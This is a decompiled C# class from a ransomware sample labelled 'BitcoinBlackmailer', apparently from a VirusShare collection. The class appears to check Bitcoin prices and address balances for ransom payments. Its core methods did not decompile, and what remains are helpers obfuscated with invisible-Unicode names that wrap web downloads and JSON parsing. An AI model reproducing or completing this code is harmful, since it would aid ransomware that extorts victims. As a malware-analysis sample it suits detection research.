// Decompiled with JetBrains decompiler
// Type: Main.Tools.Blockr
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 25D34CEB-BE06-4B6E-A57D-2F6CE77D45CE
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-e8ac8a79bf4ec0cba992bbded2974968b9bcdadfafe08ed597e604e8099cd64c.exe

using Newtonsoft.Json.Linq;
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Main.Tools
{
  internal static class Blockr
  {
    private static string BlockrAddress
    {
      get
      {
        // ISSUE: unable to decompile the method.
      }
    }

    internal static double GetPrice()
    {
      // ISSUE: unable to decompile the method.
    }

    internal static double GetBalanceBtc(string address)
    {
      // ISSUE: unable to decompile the method.
    }

    static string \u202A‏⁭⁪‪⁬⁯⁪‬⁫‭⁫​⁫⁫⁪​‭‍‮⁮‬⁮‪⁮‭⁮‏‏‪‌⁭​‮⁮⁯‏‎‌⁪‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static WebClient \u206D⁪‌‭‪⁯​⁮‏⁪‫‫⁭‮‫‪‍‎‪‎⁭‌⁮⁫​‍⁬‎⁯‭‍‍‮⁫⁭‬⁯‏⁯⁬‮() => new WebClient();

    static string \u206D‍⁮‎⁪‮‍‏‍‎⁫⁭‭⁫‬⁫​‏‬⁫‪⁭​⁯⁮‬‌‭‏⁮‮‍‬⁫​‬‌⁫‏‬‮([In] WebClient obj0, [In] string obj1) => obj0.DownloadString(obj1);

    static JObject \u206C⁫‮⁯‎‎‮⁮‭‮‏‫‭‏‬‪‪⁫‫‫‏⁪‭‍‮⁯⁯⁭‏‏⁪⁯⁭‭⁪‍‬⁫⁮⁫‮([In] string obj0) => JObject.Parse(obj0);

    static JToken \u206F‬‫⁪‎‎‏‪⁫‫‬​⁬‬‪‪‎⁭⁬‎‭‏⁭⁭⁫⁬​‭‫​⁮‌⁭⁪‌‌‫‍‬‎‮([In] JObject obj0, [In] string obj1) => obj0[obj1];

    static string \u202A⁭⁬⁯‬‭‍‍‬‮​‎‬‏‍⁮‌⁬‏‭‌⁭⁯⁪‭⁯⁭⁯⁯‌‪⁯‭⁭‪‭‎⁫‪⁪‮([In] object obj0) => obj0.ToString();

    static bool \u200C⁭‌⁫‎⁯⁪‫‮‮‬⁭⁯⁭‬⁭‮⁪‍⁭⁫‮‏‮‌⁯‍‎‭​‍‬⁪‫⁮‭‬⁪⁪‪‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static Exception \u202C‍‍‬‌⁭⁮‬‎‏‍‌‬‏‮‎‫‎‭‬​​‍‮‬‫‪⁯‬‬‭‌​​⁫‏⁭⁮⁭‪‮([In] string obj0) => new Exception(obj0);

    static JToken \u200E⁮‮​‪‮‫⁮‌⁯‎⁭​⁭⁪‎⁭‍⁪⁫‏‭‬‮‌‪‌⁯‪‭⁯​⁭⁬⁪‭‮‌‮‍‮([In] JToken obj0, [In] object obj1) => obj0[obj1];

    static string \u202C⁭‬​‬‍‍⁭‏‏⁬‬‬‌‭⁪⁯⁪‫‪‌‫⁪‎​⁭⁫‬​⁯⁯‎⁪⁯‎‍‮‪‪‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }
  }
}
